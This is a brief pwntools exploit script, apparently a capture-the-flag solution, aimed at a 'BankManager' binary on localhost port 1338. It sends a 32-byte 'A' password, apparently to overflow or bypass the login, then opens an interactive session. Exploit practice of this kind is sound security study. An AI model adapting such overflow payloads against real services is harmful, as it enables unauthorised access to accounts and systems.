#!/usr/bin/env python3

from pwn import *

exe = ELF("./BankManager")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1338)

    return r


def main():
    r = conn()

    r.sendlineafter(b"fare?", b"1")
    
    r.sendlineafter(b"username: ", b"A")
    
    r.sendlineafter(b"password: ", b"A"*32)
    
    r.sendlineafter(b"fare?", b"0")
    
    r.interactive()


if __name__ == "__main__":
    main()
